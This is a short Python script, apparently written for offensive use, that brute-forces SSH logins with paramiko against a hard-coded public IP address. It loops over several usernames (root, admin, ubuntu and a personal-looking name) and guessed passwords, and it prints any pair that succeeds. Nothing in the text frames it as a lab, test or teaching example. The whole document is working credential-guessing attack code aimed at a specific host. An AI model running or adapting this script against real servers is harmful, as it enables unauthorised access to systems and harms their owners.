import paramiko

SSH_HOST = '47.251.102.205'

users = ['root', 'dingyuchenA1', 'dingyuchen', 'admin', 'ubuntu']
passwords = ['dingyuchenA1', 'dingyuchenA1@', 'root', 'admin']

for user in users:
    for pwd in passwords:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(SSH_HOST, port=22, username=user, password=pwd, timeout=5)
            print(f'SUCCESS: {user}:{pwd}')
            client.close()
            break
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f'Error {user}@{SSH_HOST}: {str(e)[:40]}')
            break
    else:
        continue
    break
else:
    print('All combinations failed')
